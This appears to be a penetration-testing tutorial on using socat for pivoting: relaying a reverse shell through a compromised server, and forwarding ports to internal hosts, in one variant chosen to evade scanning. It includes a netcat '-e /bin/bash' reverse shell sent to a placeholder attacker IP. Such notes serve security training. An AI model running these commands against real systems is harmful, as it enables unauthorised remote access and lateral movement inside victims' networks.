It's best to think of socat as a way to join two things together. It creates a link between two different locations.

- This can be two ports on the same machine
- This can be to create a relay between two different machines
- This can be to create a connection between a port and a file on the listening machine, or many other similar things.

## Reverse Shell Relay

In this scenario, we use socat to create a relay allowing us to `send a reverse shell` back to our own attacking machine.

- Let's first start with a netcat listener on our KALI.
- Then, on the compromised server, use the following command to start the relay:
- From there, we can then create a reverse shell to the newly opened port 8000 on the compromised server.

```sh
# KALI
nc -nlvp 4242
```

```sh
# COMPROMISED SERVER
socat tcp-l:8000 tcp:ATTACKING_IP:NETCAT_PORT &
nc  127.0.0.1 8000 -e /bin/bash
```

_Make sure to first open the listening port, then reconnect to the attacking machine._

This way, we can set up a relay to send reverse shells through a compromised system, to our own attacking machine.

## Port Forwarding Easy

The quick and easy way to set up port forwarding with socat is simply to open a listening port on the compromised server and redirect everything that arrives there to the target server.

> For example, if the compromised server is 172.16.0.5 and the target is port 3306 of 172.16.0.10, we could use the following command (on the compromised server) to create a port forward:

```sh
socat tcp-l:33060,fork,reuseaddr tcp:172.16.0.10:3306 &
```

This opens port 33060 on the compromised server and redirects input from the attacking machine directly to the intended target server, essentially giving us access to the (probably MySQL database) running on our target of 172.16.0.10.

The `fork` option is used to put each connection into a new process, and the `reuseaddr` option means that the port remains open after a connection is made to it.

Combined, they allow us to use the same port forward for multiple connections.

We can now connect to port 33060 on the relay (172.16.0.5) and have our connection directly relayed to our intended target of 172.16.0.10:3306.

## Port Forwarding Quiet

The previous technique is simple and fast, but it also opens a port on the compromised server, which could potentially be spotted by any type of host or network scanning.

This method is slightly more complex, but doesn't require opening an external port on the compromised server.

- First, on our own attacking machine:

```sh
socat tcp-l:8001 tcp-l:8000,fork,reuseaddr 
```

This opens two ports: 8000 and 8001, creating a local port relay. What goes into one will come out of the other.

- Next, on the compromised relay server (172.16.0.5 in the previous example):

```sh
socat tcp:ATTACKING_IP:8001 tcp:TARGET_IP:TARGET_PORT,fork &
```

This establishes a connection between our listening port 8001 on the attacking machine and the open port of the target server.

- To use the previous fictional network:

```sh
socat tcp:10.50.73.2:8001 tcp:172.16.0.10:80,fork &
```

This would create a link between port 8000 on our attacking machine and port 80 on the intended target (172.16.0.10), meaning we could access `localhost:8000` in our attacking machine's web browser to load the web page served by the target: 172.16.0.10:80!
